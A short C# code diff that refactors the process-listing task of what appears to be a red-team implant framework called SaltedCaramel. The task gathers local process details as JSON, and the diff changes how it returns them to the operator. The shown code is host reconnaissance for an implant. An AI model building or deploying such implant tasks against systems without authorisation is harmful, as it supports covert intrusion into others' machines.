@@ -7,9 +7,9 @@ using System.Security.Principal;
 
 namespace SaltedCaramel.Tasks
 {
-    class ProcessList
+    internal class ProcessList
     {
-        internal static void Execute(SCTask task, SCImplant implant)
+        internal static void Execute(SCTaskObject task)
         {
             List<Dictionary<string, string>> procList = new List<Dictionary<string, string>>();
             foreach (Process proc in Process.GetProcesses())
@@ -39,9 +39,8 @@ namespace SaltedCaramel.Tasks
                 procList.Add(procEntry);
             }
 
-            SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procList));
-            implant.PostResponse(response);
-            implant.SendComplete(task.id);
+            task.status = "complete";
+            task.message = JsonConvert.SerializeObject(procList);
         }
 
         // No way of getting parent process from C#, but we can use NtQueryInformationProcess to get this info.
